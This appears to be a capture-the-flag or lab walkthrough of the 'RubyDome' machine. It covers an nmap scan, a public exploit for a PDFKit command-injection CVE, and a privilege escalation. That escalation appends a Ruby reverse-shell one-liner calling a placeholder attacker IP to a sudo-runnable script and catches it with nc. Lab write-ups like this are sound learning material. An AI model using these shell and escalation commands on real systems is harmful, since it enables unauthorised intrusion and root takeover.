IP: **192.168.133.22**

nmap: 
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
Next steps/Observations:

`- There is a web server being hosted on port 3000. From the nmap scan we retrieved a version number and what is hosting it.

`- Our next steps are to test out the web page features to see if anything stands out
		Observations: There is an error code that the website delivers us, when prompted a legitimate url with html. We see in the output a file path called "/usr/local/bin/ and what this even is, is a # **PDFKit** and it converts html to pdf. If provided the right url, it should demonstrate us a pdf of the page. 


`- If nothing stands our immediately we can then see what go buster gives us back.

`- We can then simply just do a lookup on the service running if there is a related cve or something.
		Observations: Possible CVE if this github doesnt work (# CVE-2022-25765/https://github.com/UNICORDev/exploit-CVE-2022-25765)

Results:
Was able to clone the github url and compile the exploit and run it. The exploit works and I now have a shell on the first user. 


Enum: After stabilizing the shell we immediately see that we are signed in as a user named: andrew.

---

## Privilege Escalation

Ran `sudo -l` to check sudo permissions:

```bash
sudo -l
```

Output:
```
(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

andrew can run Ruby as root with no password — but only that exact command and file path.

**Exploitation:**
- `app.rb` is writable by andrew (`-rwxrwx---`)
- Appended a Ruby reverse shell to the end of the file:

```bash
echo "require 'socket'; spawn('sh',[:in,:out,:err]=>TCPSocket.new(\"<KALI-IP>\",4445))" >> /home/andrew/app/app.rb
```

- If port needs changing without breaking the shell, use sed:

```bash
sed -i 's/9001/4445/' /home/andrew/app/app.rb
```

- Started listener on Kali:

```bash
nc -lnvp 4445
```

- Triggered execution as root:

```bash
sudo /usr/bin/ruby /home/andrew/app/app.rb
```

Shell caught as root. Both flags captured.

---

## Key Takeaways

- WEBrick is just the web server — the real attack surface was PDFKit underneath
- CVE-2022-25765 → command injection via unsanitized URL passed to PDFKit
- Privesc via writable sudo script — always check `sudo -l` and then check if the file is writable
- Nano won't work in a raw reverse shell — use echo or sed to edit files instead